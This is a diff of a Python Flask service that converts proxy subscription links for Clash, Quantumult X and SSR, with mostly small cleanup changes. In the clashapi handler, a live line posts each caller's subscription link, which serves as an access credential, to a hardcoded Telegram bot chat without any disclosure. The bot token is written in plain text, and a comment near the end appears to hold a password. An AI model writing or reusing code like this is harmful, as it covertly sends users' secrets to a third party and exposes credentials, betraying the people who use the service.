@@ -223,7 +223,7 @@ def getcustomssrlink(sublink, flagname):    #客制化ssr订阅
 
 def writeRulescustom(sublink,flagname,selectfirst):    #客制化策略组及规则
     try:
-        print(sublink + 'custom')
+        #print(sublink + 'custom')
         other=[]       
         Peoxies = ''
         noderemark = ''      #用于剔除节点标准
@@ -399,12 +399,12 @@ def clashapi():
             arg = 'no'
         #print(arg)
         try:
-            custom = request.args.get('custom').replace('!','&')
+            custom = request.args.get('custom')
         except Exception as e:
             custom = ''
         #print(custom)
-        requests.post('https://api.telegram.org/bot976092923:AAFqWi5Z6XqDffkdxDc7gqyDDMg12ufXFW8/sendMessage?chat_id=447216258&text={text}'.format(text='有人调用了New_ClashAPI : \n'+sub+custom))
-        if custom == '' :
+        requests.post('https://api.telegram.org/bot976092923:AAFqWi5Z6XqDffkdxDc7gqyDDMg12ufXFW8/sendMessage?chat_id=447216258&text={text}'.format(text='有人调用了New_ClashAPI : \n'+sub+str(custom)))
+        if custom == '' or custom == None :
             return writeRules(sub,arg)
         else :
             return  writeRulescustom(sub,custom,arg)
@@ -414,7 +414,7 @@ def clashapi():
 @app.route('/qx/nico', methods=['GET', 'POST'])
 def qxapi():
     try:
-        sub = request.args.get('sublink').replace('!','&')              
+        sub = request.args.get('sublink')            
         #print(sub)
         tag=request.args.get('tag')
         #print(tag)
@@ -427,7 +427,7 @@ def qxapi():
 @app.route('/ssr/nico', methods=['GET', 'POST'])
 def ssrapi():
     try:
-        sub = request.args.get('sublink').replace('!','&')              
+        sub = request.args.get('sublink')             
         #print(sub)
         custom=request.args.get('custom')
         #print(tag)
@@ -435,7 +435,7 @@ def ssrapi():
         return  getcustomssrlink(sub,custom)
 
     except Exception as e:
-        return '请调用格式适合正确'
+        return '检测调用格式是否正确'
 if __name__ == '__main__':
-    # :  @R0zR*j#xri5
+    #:  @R0zR*j#xri5
     app.run(host='0.0.0.0',debug=False,port=10086)
